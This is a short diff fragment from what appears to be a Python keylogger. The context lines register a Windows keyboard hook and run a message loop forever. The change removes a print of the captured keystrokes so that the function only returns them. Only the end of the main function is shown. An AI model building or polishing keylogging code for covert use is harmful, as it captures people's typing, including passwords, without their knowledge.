@@ -88,8 +88,7 @@ def main():
     # register the hook and execute forever
     kl.HookKeyboard()
     win32gui.PumpMessages()
-
-    print(KeyLogs)
+    
     return(KeyLogs)
 
 main()
